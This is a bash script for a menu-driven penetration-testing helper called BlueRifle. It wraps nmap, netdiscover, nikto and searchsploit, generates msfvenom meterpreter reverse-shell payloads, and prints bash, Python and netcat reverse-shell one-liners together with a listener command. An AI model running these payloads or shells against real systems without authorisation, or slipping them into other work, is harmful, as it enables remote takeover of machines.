#!/bin/bash

# BlueRifle v2.0 - Advanced Cybersecurity Framework
# Features: Real tool execution, Config system, Session management, SearchSploit integration

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

# Setup directories
CONFIG_DIR="$HOME/.bluerifle"
SESSION_DIR="$CONFIG_DIR/sessions"
CONFIG_FILE="$CONFIG_DIR/config.conf"
HISTORY_FILE="$CONFIG_DIR/history.log"

# Initialize BlueRifle
init_bluerifle() {
    if [ ! -d "$CONFIG_DIR" ]; then
        mkdir -p "$CONFIG_DIR"
        mkdir -p "$SESSION_DIR"
        echo "[*] Creating BlueRifle configuration directory..."
    fi
    
    if [ ! -f "$CONFIG_FILE" ]; then
        cat > "$CONFIG_FILE" << 'CONF'
TARGET_IP=""
TARGET_PORT="80"
TARGET_HOST=""
OUTPUT_DIR="$HOME/.bluerifle/reports"
WORDLIST="/usr/share/wordlists/rockyou.txt"
THREADS="4"
TIMEOUT="30"
VERBOSE="true"
CONF
    fi
    
    source "$CONFIG_FILE"
}

# Load configuration
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    fi
}

# Save configuration
save_config() {
    cat > "$CONFIG_FILE" << CONF
TARGET_IP="$TARGET_IP"
TARGET_PORT="$TARGET_PORT"
TARGET_HOST="$TARGET_HOST"
OUTPUT_DIR="$OUTPUT_DIR"
WORDLIST="$WORDLIST"
THREADS="$THREADS"
TIMEOUT="$TIMEOUT"
VERBOSE="$VERBOSE"
CONF
}

# Session management
create_session() {
    local session_name=$1
    local session_file="$SESSION_DIR/$session_name.session"
    
    if [ -f "$session_file" ]; then
        echo -e "${RED}[!] Session already exists${NC}"
        return 1
    fi
    
    cat > "$session_file" << SESSION
[Session: $session_name]
Created: $(date)
Target: $TARGET_IP
Host: $TARGET_HOST
Port: $TARGET_PORT
Tools_Used: []
Results: []
SESSION
    
    echo -e "${GREEN}[+] Session '$session_name' created${NC}"
}

list_sessions() {
    clear
    echo -e "${CYAN}${BOLD}[*] Saved Sessions${NC}"
    echo ""
    
    if [ -z "$(ls -A $SESSION_DIR 2>/dev/null)" ]; then
        echo -e "${YELLOW}[!] No sessions found${NC}"
        return
    fi
    
    local count=1
    for session in "$SESSION_DIR"/*.session; do
        echo -e "${GREEN}$count${NC} - $(basename $session .session)"
        echo "   $(head -2 $session | tail -1)"
        count=$((count+1))
    done
    echo ""
    read -p "Enter session number to view (or 0 to go back): " session_choice
    
    if [ "$session_choice" != "0" ]; then
        local selected=$(ls "$SESSION_DIR"/*.session 2>/dev/null | sed -n "${session_choice}p")
        if [ -f "$selected" ]; then
            cat "$selected"
            echo ""
            read -p "Press Enter to continue..."
        fi
    fi
}

log_activity() {
    local activity=$1
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $activity" >> "$HISTORY_FILE"
}

# Banner
print_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
    
    ███████████████████████████████████████████████████████████████
    █                                                             █
    █   ██████╗ ██╗     ███████╗██╗   ██╗██████╗ ███████╗██╗██╗██╗
    █   ██╔══██╗██║     ██╔════╝██║   ██║██╔══██╗██╔════╝██║██║██║
    █   ██████╔╝██║     █████╗  ██║   ██║██████╔╝███████╗██║██║██║
    █   ██╔═══╝ ██║     ██╔══╝  ██║   ██║██╔══██╗╚════██║╚═╝╚═╝╚═╝
    █   ██║     ███████╗███████╗╚██████╔╝██║  ██║███████║██╗██╗██╗
    █   ╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝╚═╝
    █                                                             █
    █              🔓 CYBERSECURITY FRAMEWORK v2.0 🔓             █
    █         Real Tools • Session Management • SearchSploit      █
    █                                                             █
    ███████████████████████████████████████████████████████████████

EOF
    echo -e "${NC}"
}

# Menus
show_main_menu() {
    echo -e "${CYAN}${BOLD}[*] Main Menu${NC}"
    echo -e "${WHITE}Target: $TARGET_IP:$TARGET_PORT | Host: $TARGET_HOST${NC}"
    echo ""
    echo -e "${GREEN}  1${NC} - Reconnaissance & Scanning"
    echo -e "${GREEN}  2${NC} - Vulnerability Assessment"
    echo -e "${GREEN}  3${NC} - Exploitation Framework"
    echo -e "${GREEN}  4${NC} - Network Analysis"
    echo -e "${RED}  0${NC} - Exit"
    echo ""
}

show_recon_menu() {
    clear
    echo -e "${CYAN}${BOLD}[*] Reconnaissance & Scanning${NC}"
    echo ""
    echo -e "${GREEN}  1${NC} - NMAP (Port Scanning)"
    echo -e "${GREEN}  2${NC} - Netdiscover (ARP Scanning)"
    echo -e "${RED}  0${NC} - Back"
    echo ""
}

show_vuln_menu() {
    clear
    echo -e "${CYAN}${BOLD}[*] Vulnerability Assessment${NC}"
    echo ""
    echo -e "${GREEN}  1${NC} - Nikto (Web Server Scanner)"
    echo -e "${GREEN}  2${NC} - SearchSploit (Exploit Database)"
    echo -e "${RED}  0${NC} - Back"
    echo ""
}

show_exploit_menu() {
    clear
    echo -e "${CYAN}${BOLD}[*] Exploitation Framework${NC}"
    echo ""
    echo -e "${GREEN}  1${NC} - MSFVenom Payload Generator"
    echo -e "${GREEN}  2${NC} - Reverse Shell Generator"
    echo -e "${RED}  0${NC} - Back"
    echo ""
}

show_settings_menu() {
    clear
    echo -e "${CYAN}${BOLD}[*] Settings & Configuration${NC}"
    echo ""
    echo -e "${GREEN}  1${NC} - Configure Target IP/Host"
    echo -e "${GREEN}  2${NC} - Check Installed Tools"
    echo -e "${GREEN}  3${NC} - Create New Session"
    echo -e "${GREEN}  4${NC} - View Saved Sessions"
    echo -e "${GREEN}  5${NC} - View Activity Log"
    echo -e "${RED}  0${NC} - Back"
    echo ""
}

# NMAP Scanner
run_nmap() {
    clear
    echo -e "${CYAN}${BOLD}[*] NMAP Port Scanner${NC}"
    echo ""
    
    if ! command -v nmap &> /dev/null; then
        echo -e "${RED}[!] NMAP is not installed${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    read -p "Enter target IP/hostname (or press Enter for $TARGET_IP): " target
    target=${target:-$TARGET_IP}
    
    if [ -z "$target" ]; then
        echo -e "${RED}[!] No target specified${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo -e "${YELLOW}Scan options:${NC}"
    echo "1 - Quick scan (top 1000 ports)"
    echo "2 - Standard scan (common ports)"
    echo "3 - Full scan (all ports)"
    
    read -p "Select scan type: " scan_type
    
    local nmap_cmd="nmap"
    case $scan_type in
        1) nmap_cmd="$nmap_cmd -F $target" ;;
        2) nmap_cmd="$nmap_cmd $target" ;;
        3) nmap_cmd="$nmap_cmd -p- $target" ;;
        *) nmap_cmd="$nmap_cmd $target" ;;
    esac
    
    echo ""
    echo -e "${YELLOW}[*] Running: $nmap_cmd${NC}"
    echo ""
    
    eval "$nmap_cmd"
    log_activity "NMAP scan on $target - Type: $scan_type"
    
    echo ""
    read -p "Press Enter to continue..."
}

# Netdiscover
run_netdiscover() {
    clear
    echo -e "${CYAN}${BOLD}[*] Netdiscover ARP Scanner${NC}"
    echo ""
    
    if ! command -v netdiscover &> /dev/null; then
        echo -e "${RED}[!] Netdiscover is not installed${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    read -p "Enter network range (e.g., 192.168.1.0/24): " network
    
    if [ -z "$network" ]; then
        echo -e "${RED}[!] No network specified${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo -e "${YELLOW}[*] Scanning network: $network${NC}"
    echo ""
    
    sudo netdiscover -r "$network"
    log_activity "Netdiscover scan on $network"
    
    read -p "Press Enter to continue..."
}

# Nikto
run_nikto() {
    clear
    echo -e "${CYAN}${BOLD}[*] Nikto Web Server Scanner${NC}"
    echo ""
    
    if ! command -v nikto &> /dev/null; then
        echo -e "${RED}[!] Nikto is not installed${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    read -p "Enter target host (or press Enter for $TARGET_HOST): " target
    target=${target:-$TARGET_HOST}
    
    read -p "Enter port (or press Enter for $TARGET_PORT): " port
    port=${port:-$TARGET_PORT}
    
    if [ -z "$target" ]; then
        echo -e "${RED}[!] No target specified${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo -e "${YELLOW}[*] Running Nikto on $target:$port${NC}"
    echo ""
    
    nikto -h "$target:$port"
    log_activity "Nikto scan on $target:$port"
    
    read -p "Press Enter to continue..."
}

# SearchSploit
run_searchsploit() {
    clear
    echo -e "${CYAN}${BOLD}[*] SearchSploit - Exploit Database${NC}"
    echo ""
    
    if ! command -v searchsploit &> /dev/null; then
        echo -e "${RED}[!] SearchSploit is not installed${NC}"
        echo -e "${YELLOW}Install with: apt-get install exploitdb${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    read -p "Enter software/vulnerability to search: " search_term
    
    if [ -z "$search_term" ]; then
        echo -e "${RED}[!] No search term specified${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo -e "${YELLOW}[*] Searching for: $search_term${NC}"
    echo ""
    
    searchsploit "$search_term"
    log_activity "SearchSploit search: $search_term"
    
    echo ""
    read -p "Press Enter to continue..."
}

# MSFVenom
run_msfvenom() {
    clear
    echo -e "${CYAN}${BOLD}[*] MSFVenom Payload Generator${NC}"
    echo ""
    
    if ! command -v msfvenom &> /dev/null; then
        echo -e "${RED}[!] MSFVenom is not installed${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "${MAGENTA}Payload Types:${NC}"
    echo "1 - Windows Reverse Shell (exe)"
    echo "2 - Linux Reverse Shell (elf)"
    echo "3 - Android Reverse Shell (apk)"
    
    read -p "Select payload type: " payload_type
    
    read -p "Enter LHOST (attacker IP): " lhost
    read -p "Enter LPORT (attacker port): " lport
    
    if [ -z "$lhost" ] || [ -z "$lport" ]; then
        echo -e "${RED}[!] LHOST and LPORT are required${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    local output_file="payload_$(date +%s)"
    
    case $payload_type in
        1)
            echo -e "${YELLOW}[*] Generating Windows EXE payload...${NC}"
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o "$output_file.exe"
            echo -e "${GREEN}[+] Payload saved to: $output_file.exe${NC}"
            log_activity "Generated Windows EXE payload"
            ;;
        2)
            echo -e "${YELLOW}[*] Generating Linux ELF payload...${NC}"
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o "$output_file.elf"
            chmod +x "$output_file.elf"
            echo -e "${GREEN}[+] Payload saved to: $output_file.elf${NC}"
            log_activity "Generated Linux ELF payload"
            ;;
        3)
            echo -e "${YELLOW}[*] Generating Android APK payload...${NC}"
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o "$output_file.apk"
            echo -e "${GREEN}[+] Payload saved to: $output_file.apk${NC}"
            log_activity "Generated Android APK payload"
            ;;
    esac
    
    echo ""
    read -p "Press Enter to continue..."
}

# Reverse Shell Generator
run_reverse_shell() {
    clear
    echo -e "${CYAN}${BOLD}[*] Reverse Shell Generator${NC}"
    echo ""
    
    echo -e "${MAGENTA}Shell Types:${NC}"
    echo "1 - Bash Reverse Shell"
    echo "2 - Python Reverse Shell"
    echo "3 - Netcat Reverse Shell"
    
    read -p "Select shell type: " shell_type
    read -p "Enter attacker IP (LHOST): " lhost
    read -p "Enter attacker port (LPORT): " lport
    
    if [ -z "$lhost" ] || [ -z "$lport" ]; then
        echo -e "${RED}[!] LHOST and LPORT are required${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo ""
    echo -e "${GREEN}[+] Copy the command below:${NC}"
    echo ""
    
    case $shell_type in
        1)
            echo -e "${YELLOW}bash -i >& /dev/tcp/$lhost/$lport 0>&1${NC}"
            log_activity "Generated Bash reverse shell"
            ;;
        2)
            echo -e "${YELLOW}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${NC}"
            log_activity "Generated Python reverse shell"
            ;;
        3)
            echo -e "${YELLOW}nc -e /bin/sh $lhost $lport${NC}"
            log_activity "Generated Netcat reverse shell"
            ;;
    esac
    
    echo ""
    echo -e "${CYAN}[*] Remember to set up a listener:${NC}"
    echo -e "${YELLOW}nc -lvnp $lport${NC}"
    echo ""
    read -p "Press Enter to continue..."
}

# Configure Target
configure_target() {
    clear
    echo -e "${CYAN}${BOLD}[*] Configure Target${NC}"
    echo ""
    
    read -p "Enter target IP (current: $TARGET_IP): " new_ip
    read -p "Enter target host (current: $TARGET_HOST): " new_host
    read -p "Enter target port (current: $TARGET_PORT): " new_port
    
    if [ -n "$new_ip" ]; then
        TARGET_IP="$new_ip"
    fi
    if [ -n "$new_host" ]; then
        TARGET_HOST="$new_host"
    fi
    if [ -n "$new_port" ]; then
        TARGET_PORT="$new_port"
    fi
    
    save_config
    echo -e "${GREEN}[+] Configuration updated${NC}"
    read -p "Press Enter to continue..."
}

# Check Tools
check_tools() {
    clear
    echo -e "${CYAN}${BOLD}[*] Checking Installed Tools${NC}"
    echo ""
    
    tools=("nmap" "nikto" "netdiscover" "searchsploit" "msfvenom" "sqlmap" "gobuster" "hashcat")
    
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "${GREEN}✓${NC} $tool is installed"
        else
            echo -e "${RED}✗${NC} $tool is NOT installed"
        fi
    done
    
    echo ""
    read -p "Press Enter to continue..."
}

# View Activity Log
view_log() {
    clear
    echo -e "${CYAN}${BOLD}[*] Activity Log${NC}"
    echo ""
    
    if [ -f "$HISTORY_FILE" ]; then
        tail -20 "$HISTORY_FILE"
    else
        echo -e "${YELLOW}[!] No activity log found${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Main Loop
main() {
    init_bluerifle
    load_config
    
    while true; do
        print_banner
        show_main_menu
        
        read -p "$(echo -e ${CYAN})[*]$(echo -e ${NC}) Select option: " choice
        
        case $choice in
            1)
                while true; do
                    show_recon_menu
                    read -p "$(echo -e ${CYAN})[*]$(echo -e ${NC}) Select tool: " recon_choice
                    
                    case $recon_choice in
                        1) run_nmap ;;
                        2) run_netdiscover ;;
                        0) break ;;
                        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
                    esac
                done
                ;;
            2)
                while true; do
                    show_vuln_menu
                    read -p "$(echo -e ${CYAN})[*]$(echo -e ${NC}) Select tool: " vuln_choice
                    
                    case $vuln_choice in
                        1) run_nikto ;;
                        2) run_searchsploit ;;
                        0) break ;;
                        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
                    esac
                done
                ;;
            3)
                while true; do
                    show_exploit_menu
                    read -p "$(echo -e ${CYAN})[*]$(echo -e ${NC}) Select module: " exploit_choice
                    
                    case $exploit_choice in
                        1) run_msfvenom ;;
                        2) run_reverse_shell ;;
                        0) break ;;
                        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
                    esac
                done
                ;;
            4)
                echo -e "${YELLOW}[*] Network Analysis coming soon...${NC}"
                read -p "Press Enter to continue..."
                ;;
            0)
                clear
                echo -e "${CYAN}${BOLD}[*] Exiting BlueRifle...${NC}"
                echo ""
                echo -e "${RED}"
                cat << "EOF"
    ╔═══════════════════════════════════════════════════════╗
    ║       Thanks for using BlueRifle v2.0 🔓              ║
    ║      Stay safe, happy hunting, hack responsibly!      ║
    ╚═══════════════════════════════════════════════════════╝
EOF
                echo -e "${NC}"
                exit 0
                ;;
            9)
                while true; do
                    show_settings_menu
                    read -p "$(echo -e ${CYAN})[*]$(echo -e ${NC}) Select option: " settings_choice
                    
                    case $settings_choice in
                        1) configure_target ;;
                        2) check_tools ;;
                        3) read -p "Enter session name: " sess_name; create_session "$sess_name"; read -p "Press Enter..."; read -p "Press Enter..." ;;
                        4) list_sessions ;;
                        5) view_log ;;
                        0) break ;;
                        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
                    esac
                done
                ;;
            *)
                echo -e "${RED}[!] Invalid option, try again${NC}"
                sleep 2
                ;;
        esac
    done
}

# Run it
main
